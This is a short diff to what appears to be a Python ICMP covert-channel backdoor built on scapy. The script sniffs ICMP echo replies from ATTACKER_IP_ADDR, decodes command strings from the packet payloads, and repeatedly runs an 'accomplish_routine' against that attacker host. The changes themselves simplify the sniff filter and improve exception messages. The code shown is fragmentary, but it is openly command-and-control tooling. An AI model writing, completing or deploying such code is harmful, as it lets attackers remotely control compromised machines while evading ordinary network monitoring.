@@ -68,8 +68,8 @@ def retrieve_command(response):
     return response[scapy.ICMP].payload.load.decode("utf-8").split()  # forge_random_command().decode("utf-8").split()
 
 
-def receive_response_packet(request, timeout, nb_responses):
-    return scapy.sniff(filter=f"ip host {ATTACKER_IP_ADDR} and ip proto icmp and icmp[icmptype] = icmp-echoreply",
+def receive_response_packet(timeout, nb_responses):
+    return scapy.sniff(filter=f"host {ATTACKER_IP_ADDR} and icmp",
                        count=nb_responses, timeout=timeout)
 
 
@@ -141,8 +141,8 @@ if __name__ == '__main__':
         try:
             if can_proceed(ATTACKER_IP_ADDR):
                 accomplish_routine(ATTACKER_IP_ADDR)
-        except:
-            print("Something went wrong")
+        except Exception as err:
+            print(f"Unexpected {err=}, {type(err)=}")
         else:
             print("Nothing went wrong!")
         finally:
